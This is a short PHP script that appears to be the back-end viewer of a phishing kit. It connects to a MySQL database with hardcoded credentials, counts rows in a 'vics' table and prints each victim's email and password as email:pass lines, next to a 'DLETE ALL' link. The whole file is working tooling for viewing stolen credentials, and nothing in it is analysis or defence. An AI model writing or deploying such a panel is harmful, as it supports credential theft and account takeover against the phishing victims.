<?php
$conn = mysqli_connect('localhost','bolekkeg_admin','Zeyadpc123!','bolekkeg_accs') or die("Error Connect , Contact Ziad");


$getvic = mysqli_query($conn,"SELECT * FROM vics");

echo 'TOTAL = '. mysqli_num_rows($getvic);
echo "<br>";
echo "<a href='dall.php'>DLETE ALL</a>";
echo "<br>";
echo "<br><br><br><br><br>";

while($vic = mysqli_fetch_array($getvic))
{
    echo $vic['vic_email'].":".$vic['vic_pass']."<br>";
}
?>